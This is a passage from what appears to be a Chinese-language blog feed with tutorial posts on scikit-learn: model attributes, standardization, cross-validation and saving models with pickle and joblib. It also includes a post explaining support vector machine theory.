    <link href="/2018/08/01/python-scikit-learn%E5%AD%A6%E4%B9%A0-2/"/>
    <url>/2018/08/01/python-scikit-learn%E5%AD%A6%E4%B9%A0-2/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-scikit-learn"><a href="#0x00-scikit-learn" class="headerlink" title="0x00 scikit-learn"></a>0x00 scikit-learn</h2><p>Scikit-learn（以前称为scikits.learn）是一个用于Python编程语言的免费开源机器学习库。它广泛地支持各种分类、聚类以及回归分析方法比如支持向量机、随机森林、DBSCAN等等，由于其强大的功能、优异的拓展性以及易用性，目前受到了很多数据科学从业者的欢迎，也是业界相当著名的一个开源项目之一。</p><h2 id="0x01-模型属性与功能"><a href="#0x01-模型属性与功能" class="headerlink" title="0x01 模型属性与功能"></a>0x01 模型属性与功能</h2><p>sklearn库中所有机器学习的模型对象中都有一些属性与功能，假设模型对象名为mod，那么就可以这样表示mod模型的一些属性与功能：</p><ul><li>mod.coef_  x前的系数</li><li>mod.intercept_  截距</li><li>mod.predict() 预测</li><li>mod.get_params() 定义的参数</li><li>mod.score(data_x,data_y) 用data_x做预测，用data_y做比较给模型打分</li></ul><p>我们以上一篇中的线性回归模型为例查看一下这些属性：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from sklearn import datasets<br>from sklearn<span class="hljs-selector-class">.linear_model</span> import LinearRegression<br><br><br>example_x,example_y = datasets<span class="hljs-selector-class">.make_regression</span>(n_samples=<span class="hljs-number">100</span>,n_features=<span class="hljs-number">2</span>,n_targets=<span class="hljs-number">1</span>,noise=<span class="hljs-number">3</span>)<br><br>lr = LinearRegression()<br>lr<span class="hljs-selector-class">.fit</span>(example_x,example_y)<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(lr.coef_)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(lr.intercept_)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(lr.predict(example_x[:<span class="hljs-number">5</span>,:])</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(lr.get_params()</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(lr.score(example_x,example_y)</span></span>)<br><br></code></pre></td></tr></table></figure><p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn07.png?raw=true"></p><p>可以从输出中看到：</p><ul><li>lr.coef_输出一个list代表每一种特征前的系数</li><li>lr.intercept_输出截距</li><li>lr.predict()方法可以输入样本进行预测</li><li>lr.get_params()方法可以输出模型的配置信息</li><li>lr.score()方法通过对比预测的数据和原始标签对模型打分</li></ul><h2 id="0x02-标准化"><a href="#0x02-标准化" class="headerlink" title="0x02 标准化"></a>0x02 标准化</h2><p>在训练模型时，某些特征可能会在不同的样本中相差特别大，有一些异常大或者异常小的数据会对模型训练结果造成较大误差，并且数据分布很分散也会影响训练结果，所以一般在训练之前，我们都会对特征数值进行标准化。</p><p>基本的标准化流程是去除每个特征的平均值来转换数据使其居中，然后通过将非常数特征除以它们的标准差来对其进行缩放。</p><p>在scikit-learn库中，有用于预处理数据的模块sklearn.preprocessing，其中scale方法可以快速简便的实现上述标准化操作。用一段代码来尝试一下：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">from</span> sklearn <span class="hljs-keyword">import</span> preprocessing<br><span class="hljs-keyword">import</span> numpy as np<br><br><br>x_train = np.<span class="hljs-built_in">array</span>([[<span class="hljs-number">1</span>, <span class="hljs-number">-100</span>, <span class="hljs-number">0.03</span>],<br><span class="hljs-string">              [-1, 500, -0.02]</span>,<br><span class="hljs-string">              [0.2, 200, 0.04]</span>], dtype=np.<span class="hljs-built_in">float</span>64)<br><br><br>print(preprocessing.scale(x_train))<br></code></pre></td></tr></table></figure><p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn08.png?raw=true"></p><p>可以看到，数据都被标准化到很接近的位置，这样就更利于学习器训练了。</p><p>具体能产生多大的影响，我们可以通过datasets产生一组数据，对比直接训练和标准化之后训练的精度：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> sklearn import preprocessing<br><span class="hljs-keyword">from</span> sklearn.model_selection import train_test_split<br><span class="hljs-keyword">from</span> sklearn.datasets.samples_generator import make_classification<br><span class="hljs-keyword">from</span> sklearn.svm import SVC<br>import matplotlib.pyplot as plt<br><br>X, y = make_classification(<br>    <span class="hljs-attribute">n_samples</span>=300, <span class="hljs-attribute">n_features</span>=2,<br>    <span class="hljs-attribute">n_redundant</span>=0, <span class="hljs-attribute">n_informative</span>=2,<br>    <span class="hljs-attribute">n_clusters_per_class</span>=1,scale=100)<br><br><span class="hljs-comment">#可视化数据</span><br>plt.scatter(X[:, 0], X[:, 1], <span class="hljs-attribute">c</span>=y)<br>plt.show()<br><br>X_train, X_test, y_train, y_test = train_test_split(X, y, <span class="hljs-attribute">test_size</span>=0.3)<br>clf = SVC()<br>clf.fit(X_train, y_train)<br><span class="hljs-builtin-name">print</span>(clf.score(X_test, y_test))<br><br>X = preprocessing.scale(X)<br>X_train, X_test, y_train, y_test = train_test_split(X, y, <span class="hljs-attribute">test_size</span>=0.3)<br>clf = SVC()<br>clf.fit(X_train, y_train)<br><span class="hljs-builtin-name">print</span>(clf.score(X_test, y_test))<br></code></pre></td></tr></table></figure><p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn09.png?raw=true"></p><p>在这个程序中使用datasets中的make_classification方法产生拥有两个特征值的分类数据，然后就可以将两个特征值分别放在横轴和纵轴来观察数据分布</p><p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn10.png?raw=true"></p><p>接着对比直接训练和标准化之后训练的精度，发现前后差距非常大。</p><p>标准化还有一种常用的方式那就是将特征取值规定到一个范围（默认0-1），只需将最开始代码中标准化函数改为：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">min_max_scaler</span> = preprocessing.MinMaxScaler()<br><span class="hljs-attr">X_MinMax</span> = min_max_scaler.fit_transform(x_train)<br></code></pre></td></tr></table></figure><h2 id="0x03-交叉验证"><a href="#0x03-交叉验证" class="headerlink" title="0x03 交叉验证"></a>0x03 交叉验证</h2><p>之前在机器学习的模型评估方法里面学过几种模型验证的方法，其中也提到了，学习器训练完成后仍然在训练集种测试实际上是一种错误的方法，因为这个学习器在自身的训练集上很容易得到一个很高的分数，但是对新样本无法预测出任何有用的信息，这种情况被称为过拟合。</p><p>所以为了避免这种情况，我们一般在验证的时候会将样本分为训练集和测试集，在之前的博客（ <a href="http://next.uuzdaisuki.com/2018/07/24/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-5-%E2%80%94%E2%80%94%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E6%96%B9%E6%B3%95/">http://next.uuzdaisuki.com/2018/07/24/机器学习-5-——模型评估方法/</a> ）介绍了留数法、交叉验证法、自助法这几种方法来分割训练集与测试集。</p><p>前面的程序我们大多使用train_test_split方法将样本分为两部分，也就是留数法，那么这里就使用sklearn实现交叉验证法。</p><p>交叉验证法需要用到sklearn的cross_val_score模块，我们就在刚才svm分类算法的基础上写出交叉验证：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> sklearn import preprocessing<br><span class="hljs-keyword">from</span> sklearn.model_selection import train_test_split<br><span class="hljs-keyword">from</span> sklearn.datasets.samples_generator import make_classification<br><span class="hljs-keyword">from</span> sklearn.svm import SVC<br>import matplotlib.pyplot as plt<br><span class="hljs-keyword">from</span> sklearn.model_selection import cross_val_score<br><br><br><span class="hljs-comment">#生成具有2种属性的300笔数据</span><br>X, y = make_classification(<br>    <span class="hljs-attribute">n_samples</span>=300, <span class="hljs-attribute">n_features</span>=2,<br>    <span class="hljs-attribute">n_redundant</span>=0, <span class="hljs-attribute">n_informative</span>=2,<br>    <span class="hljs-attribute">n_clusters_per_class</span>=1,scale=100)<br><br><span class="hljs-comment">#可视化数据</span><br>plt.scatter(X[:, 0], X[:, 1], <span class="hljs-attribute">c</span>=y)<br>plt.show()<br><br>X = preprocessing.scale(X)<br>clf = SVC()<br><br><span class="hljs-attribute">scores</span>=cross_val_score(clf,X,y,cv=10,scoring=&#x27;accuracy&#x27;)<br><br><span class="hljs-builtin-name">print</span>(scores)<br><span class="hljs-builtin-name">print</span>(scores.mean())<br></code></pre></td></tr></table></figure><p>数据分布如图：</p><p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn11.png?raw=true"></p><p>输出十组分别的分数和平均分数：</p><p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn12.png?raw=true"></p><p>交叉验证因为抽取的测试集更随机化且全部抽到，所以平均后的评估得分更令人信服。</p><p>其中cross_val_score种的clf是模型，X样本特征，y是样本标签，cv是交叉验证的分组数量，scoring参数是计分指标，可以根据实际情况在官方文档选取合适的计分指标：</p><p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn13.png?raw=true"></p><h2 id="0x04-模型保存"><a href="#0x04-模型保存" class="headerlink" title="0x04 模型保存"></a>0x04 模型保存</h2><p>在实际的机器学习运用中，训练用的样本量是十分大的，也就是说训练一个模型需要的时间开销非常大，我们要使用一个训练好的模型，每次都去重新训练一遍是不现实的，所以在训练好之后我们需要保存模型。</p><p>我们常用的存取模型方法有如下两种</p><h3 id="使用pickle保存模型"><a href="#使用pickle保存模型" class="headerlink" title="使用pickle保存模型"></a>使用pickle保存模型</h3><p>第一种方法是使用pickle库保存和读取模型，以上一篇博客中的k近邻算法为例：</p><p>保存模型：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">from</span> sklearn <span class="hljs-keyword">import</span> datasets<br><span class="hljs-keyword">from</span> sklearn.neighbors <span class="hljs-keyword">import</span> KNeighborsClassifier<br><span class="hljs-keyword">import</span> pickle<br><br>iris = datasets.load_iris()<br>iris_x = iris.data<br>iris_y = iris.target<br><br>knn = KNeighborsClassifier()<br>knn.fit(iris_x,iris_y)<br><br><span class="hljs-keyword">file</span> = open(<span class="hljs-string">&quot;model/knn.pickle&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>)<br>pickle.<span class="hljs-keyword">dump</span>(knn,<span class="hljs-keyword">file</span>)<br><br></code></pre></td></tr></table></figure><p>然后当前程序目录中model子目录下就会产生一个knn.pickle的文件。</p><p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn14.png?raw=true"></p><p>读取模型：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from sklearn import datasets<br>import pickle<br><br>iris = datasets<span class="hljs-selector-class">.load_iris</span>()<br>iris_x = iris.data<br><br>file = open(<span class="hljs-string">&quot;model/knn.pickle&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>)<br>knn=pickle<span class="hljs-selector-class">.load</span>(file)<br><br>pred = knn<span class="hljs-selector-class">.predict</span>(iris_x<span class="hljs-selector-attr">[0:5]</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(pred)</span></span><br></code></pre></td></tr></table></figure><p>读取模型时直接读取这个文件，就可以使用现有模型，在以上代码中使用这个模型预测了前五个数据，我们都知道鸢尾花数据集前五个样本分类都是0，将它们放在这个模型中预测输出，发现也都是0。</p><p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn15.png?raw=true"></p><h3 id="使用joblib保存模型"><a href="#使用joblib保存模型" class="headerlink" title="使用joblib保存模型"></a>使用joblib保存模型</h3><p>第二种方法是用sklearn的joblib模块保存，joblib库会自动多线程运行，所以在面对大数据的时候性能要优于pickle模块，但是joblib模块只能将文件保存在磁盘中，而且会产生多个文件。</p><p>保存模型：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">from</span> sklearn <span class="hljs-keyword">import</span> datasets<br><span class="hljs-keyword">from</span> sklearn.neighbors <span class="hljs-keyword">import</span> KNeighborsClassifier<br><span class="hljs-keyword">from</span> sklearn.externals <span class="hljs-keyword">import</span> joblib<br><br>iris = datasets.load_iris()<br>iris_x = iris.data<br>iris_y = iris.target<br><br>knn = KNeighborsClassifier()<br>knn.fit(iris_x,iris_y)<br><br>joblib.<span class="hljs-keyword">dump</span>(knn,<span class="hljs-string">&#x27;model/knn.pkl&#x27;</span>)<br></code></pre></td></tr></table></figure><p>然后当前程序目录中model子目录下就会产生一个knn.pkl的文件，有时会产生多个文件，但是读取时只用读取第一个。</p><p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn16.png?raw=true"></p><p>读取模型：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from sklearn import datasets<br>from sklearn<span class="hljs-selector-class">.externals</span> import joblib<br><br>iris = datasets<span class="hljs-selector-class">.load_iris</span>()<br>iris_x = iris.data<br><br><br>knn=joblib<span class="hljs-selector-class">.load</span>(<span class="hljs-string">&#x27;model/knn.pkl&#x27;</span>)<br><br>pred = knn<span class="hljs-selector-class">.predict</span>(iris_x<span class="hljs-selector-attr">[0:5]</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(pred)</span></span><br></code></pre></td></tr></table></figure><p>测试结果仍然成立。</p><p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn17.png?raw=true"></p>]]></content>
    
    
    <categories>
      
      <category>机器学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>机器学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习(8)——支持向量机(SVM)</title>
    <link href="/2018/07/31/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-8-%E2%80%94%E2%80%94%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA-SVM/"/>
    <url>/2018/07/31/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-8-%E2%80%94%E2%80%94%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA-SVM/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-支持向量机"><a href="#0x00-支持向量机" class="headerlink" title="0x00 支持向量机"></a>0x00 支持向量机</h2><p>在机器学习中，支持向量机（support vector machine，常简称为SVM，又名支持向量网络）是在分类与回归分析中分析数据的监督式学习模型与相关的学习算法。给定一组训练实例，每个训练实例被标记为属于两个类别中的一个或另一个，SVM训练算法建立一个将新的实例分配给两个类别之一的模型，使其成为非概率二元（binary classifier）线性分类器。SVM模型是将实例表示为空间中的点，这样映射就使得单独类别的实例被尽可能宽的明显的间隔分开。然后，将新的实例映射到同一空间，并基于它们落在间隔的哪一侧来预测所属类别。</p><h2 id="0x01-间隔与支持向量"><a href="#0x01-间隔与支持向量" class="headerlink" title="0x01 间隔与支持向量"></a>0x01 间隔与支持向量</h2><p>首先看一张图：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_01.png?raw=true"></p><p>如果要用一条直线将两种类型的图形分开，那这样的直线我们可以找到很多条。那么哪条才是最好的分割线？</p><p>我们可以设想一下，目前的样本并不代表所有可能发生的情况，如果进入新样本，很有可能会存在向直线贴近的样本，那么如果选择的直线到两边最近的点间隔越长，输入新样本时越过这条线的机会就越小，泛化能力就越强。</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_05.png?raw=true"></p><p>图中距离这条分割线最近的这几个点，就被称为支持向量。</p><p>两个异类支持向量到这条直线的距离之和，就被称为间隔。</p><p>假设我们分割线的方程如下：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_02.png?raw=true"></p><p>其中w是法向量。</p><p>我们的可以通过它将训练样本正确分类，即</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_03.png?raw=true"></p><p>留出间隔，令：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_04.png?raw=true"></p><p>则间隔的数学表示为：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_06.png?raw=true"></p><p>我们为了找到最大间隔，也就是使γ最大，也就是使||w||²最小，就可以转换成找</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_07.png?raw=true"></p><p>的最小值。这被称为支持向量机的基本型。</p><h2 id="0x02-对偶问题"><a href="#0x02-对偶问题" class="headerlink" title="0x02 对偶问题"></a>0x02 对偶问题</h2><p>上面的问题最终转换成求支持向量机基本型的最小值问题，这是一个凸二次规划问题，可以直接求解，但是我们有更优的计算方法。那就是通过拉格朗日乘子法得到其”对偶问题“。</p><p>具体做法是对每条约束都增加拉格朗日乘子αi，则该问题可以写成：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_08.png?raw=true"></p><p>这个时候要求其最小值，从之前转换成最小值的模型前加了1/2这点就可以想到，我们接下来肯定要通过求导，求导数零点，找极值点来完成。</p><p>所以分别对w和b求导可以得出：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_09.png?raw=true"></p><p>将其结论代回L中可得对偶问题：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_10.png?raw=true"></p><p>这个结果，我们就可以直接交给机器去处理数据求这个式子的最大值了。</p><h2 id="0x03-核函数"><a href="#0x03-核函数" class="headerlink" title="0x03 核函数"></a>0x03 核函数</h2><p>线性可分的训练样本我们可以通过直线将其正确分类，但是如果遇到线性不可分的训练样本，或许就不能通过一条直线来进行分割。</p><p>这种情况下，我们可以将样本从原本的空间映射到一个更高维度的空间，使样本在这个空间内线性可分。</p><p>比如二维平面中的样本投影到三维空间中，就可以通过一个超平面线性分割两类样本了：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_11.png?raw=true"></p><p>具体做法是用Φ(x)代表x映射之后的特征向量，对偶问题就变为：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_12.png?raw=true"></p><p>在计算Φ(xi)的转置与Φ(xj)的矩阵乘积时，在高维会变的十分困难，所以就引入了：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_13.png?raw=true"></p><p>Φ(xi)与Φ(xj)内积等于它们在原始样本空间通过k函数计算的结果，这样就不用去高维计算内积。这个k函数就被称为核函数。</p><p>常用的核函数如下：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_14.png?raw=true"></p><p>并不是所有的情况通过核函数映射之后都是线性可分的，我们会根据实际的情况去选取合适的核函数，使其映射到高维之后可以分割，然后高维分割的超平面在原始平面上的投影就是在原始平面上的分割曲线。</p><h2 id="0x04-硬间隔和软间隔"><a href="#0x04-硬间隔和软间隔" class="headerlink" title="0x04 硬间隔和软间隔"></a>0x04 硬间隔和软间隔</h2><p>即使使用了核函数，实际中，我们仍然存在一种不可分的情况，即两类样本互相有一部分出现在对方的区域，如图：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_15.png?raw=true"></p><p>那么这种情况，我们的处理方式就是允许支持向量机在一些样本上出错，也就是“软间隔”。</p><p>对应的所有样本都被正确分类就被称为“硬间隔”。</p><p>在之前机器学习的经验中我们都明白，出错就会有损失，那么我们需要一个损失函数来计算惩罚，最终的优化目标是在最大化间隔的同时使不满足约束的样本尽可能少，可写为：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_16.png?raw=true"></p><p>这里面使用的损失函数是0/1损失函数：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_17.png?raw=true"></p><p>我们也有其他几种替代损失函数可供选择：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml8_18.png?raw=true"></p><p>在软间隔情况中，只使满足最终优化目标的值优化到最小即可。</p><h2 id="0x05-支持向量机的优缺点"><a href="#0x05-支持向量机的优缺点" class="headerlink" title="0x05 支持向量机的优缺点"></a>0x05 支持向量机的优缺点</h2><p>支持向量机的优势在于:</p><ul><li><p>在高维空间中非常高效</p></li><li><p>即使在数据维度比样本数量大的情况下仍然有效</p></li><li><p>在决策函数（称为支持向量）中使用训练集的子集,因此它也是高效利用内存的</p></li><li><p>通用性: 不同的核函数 核函数与特定的决策函数一一对应，常见的kernel已<br>经提供,也可以指定定制的内核</p></li></ul><p>支持向量机的缺点包括:</p><ul><li><p>如果特征数量比样本数量大得多,在选择核函数 核函数 时要避免过拟合,<br>而且正则化项是非常重要的</p></li><li><p>支持向量机不直接提供概率估计</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>机器学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>机器学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python-scikit learn学习(1)</title>
    <link href="/2018/07/30/python-scikit-learn%E5%AD%A6%E4%B9%A0-1/"/>
    <url>/2018/07/30/python-scikit-learn%E5%AD%A6%E4%B9%A0-1/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-scikit-learn"><a href="#0x00-scikit-learn" class="headerlink" title="0x00 scikit-learn"></a>0x00 scikit-learn</h2><p>Scikit-learn（以前称为scikits.learn）是一个用于Python编程语言的免费开源机器学习库。它广泛地支持各种分类、聚类以及回归分析方法比如支持向量机、随机森林、DBSCAN等等，由于其强大的功能、优异的拓展性以及易用性，目前受到了很多数据科学从业者的欢迎，也是业界相当著名的一个开源项目之一。</p><h2 id="0x01-scikit-learn安装"><a href="#0x01-scikit-learn安装" class="headerlink" title="0x01 scikit-learn安装"></a>0x01 scikit-learn安装</h2><p>scikit-learn安装和别的python安装没有多少不同，不过安装scikit-learn之前要先安装新版本的numpy和scipy库。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pip <span class="hljs-keyword">install </span>numpy<br>pip <span class="hljs-keyword">install </span><span class="hljs-keyword">scipy</span><br><span class="hljs-keyword">pip </span><span class="hljs-keyword">install </span><span class="hljs-keyword">scikit-learn</span><br></code></pre></td></tr></table></figure><h2 id="0x02-scikit-learn数据集"><a href="#0x02-scikit-learn数据集" class="headerlink" title="0x02 scikit-learn数据集"></a>0x02 scikit-learn数据集</h2><p>scikit-learn库中有一些标准数据集。在scikit-learn官网的数据库中有大量的数据集，可以直接拿来使用。</p><p>官方数据集： <a href="http://scikit-learn.org/stable/modules/classes.html#module-sklearn.datasets">http://scikit-learn.org/stable/modules/classes.html#module-sklearn.datasets</a></p><p>其中Loaders都是现实中一些整理好的数据，可以直接使用。</p><p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn01.png?raw=true"></p><p>Samples generator中是一些用户可以通过输入参数来控制随机生成的数据。</p><p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn02.png?raw=true"></p><p>使用时我们要先导入sklearn.datasets库，如：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from sklearn import datasets<br>iris = datasets<span class="hljs-selector-class">.load_iris</span>() #鸢尾花数据集<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(iris)</span></span><br>digits = datasets<span class="hljs-selector-class">.load_digits</span>() #数字数据集<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(digits)</span></span><br></code></pre></td></tr></table></figure><ul><li>一个数据集是一个包含数据所有元素的类字典对象，这个数据存在‘.data’成员变量中，是一个n*n数组行表示样例，列表示特征。</li><li>在监督学习中，一个或多个标签Y存储在‘.target’成员变量中。</li></ul><p>从如下代码运行结果就能看出这几部分数据：</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs fortran">from sklearn <span class="hljs-keyword">import</span> datasets<br><span class="hljs-built_in">digits</span> = datasets.load_digits() #数字数据集<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">digits</span>.<span class="hljs-keyword">data</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">digits</span>.<span class="hljs-keyword">target</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">digits</span>.images[<span class="hljs-number">0</span>])<br></code></pre></td></tr></table></figure><h2 id="0x03-scikit-learn学习方法选择"><a href="#0x03-scikit-learn学习方法选择" class="headerlink" title="0x03 scikit-learn学习方法选择"></a>0x03 scikit-learn学习方法选择</h2><p>在学习和预测之前，我们要根据我们的数字数据集以及要达成的目标选择合适的机器学习方法，scikit-learn官网有一张图清晰的给出了如何去选择正确的方法：</p><p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn03.png?raw=true"></p><p>官方网站提供的原图地址： <a href="http://scikit-learn.org/stable/tutorial/machine_learning_map/index.html">http://scikit-learn.org/stable/tutorial/machine_learning_map/index.html</a></p><p>我介绍一下具体步骤：</p><ul><li><p>这张图从start部分开始读，如果数据少于50，就去获取更多数据，如果数据大于50，就进入下一步。</p></li><li><p>然后根据是否预测类别、有无标签、是否预测数量等判断分别属于分类问题、聚类问题、回归问题和降维问题四种中的哪一种。</p></li><li><p>再根据数据量、数据类型等来分别选择合适的机器学习算法。</p></li></ul><p>在选择好方法之后，从scikit-learn库导入对应的方法，然后根据官方提供的使用方法进行调用和参数的选用，就可以进行学习。</p><h2 id="0x04-scikit-learn学习与预测（分类问题）"><a href="#0x04-scikit-learn学习与预测（分类问题）" class="headerlink" title="0x04 scikit-learn学习与预测（分类问题）"></a>0x04 scikit-learn学习与预测（分类问题）</h2><p>在这里以鸢尾花数据集的学习和预测为例，讲解一下通用的scikit-learn学习与预测步骤，先贴代码：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import numpy<br>from sklearn import datasets<br>from sklearn<span class="hljs-selector-class">.model_selection</span> import train_test_split<br>from sklearn<span class="hljs-selector-class">.neighbors</span> import KNeighborsClassifier<br><br>iris = datasets<span class="hljs-selector-class">.load_iris</span>()<br>iris_x = iris.data<br>iris_y = iris.target<br><span 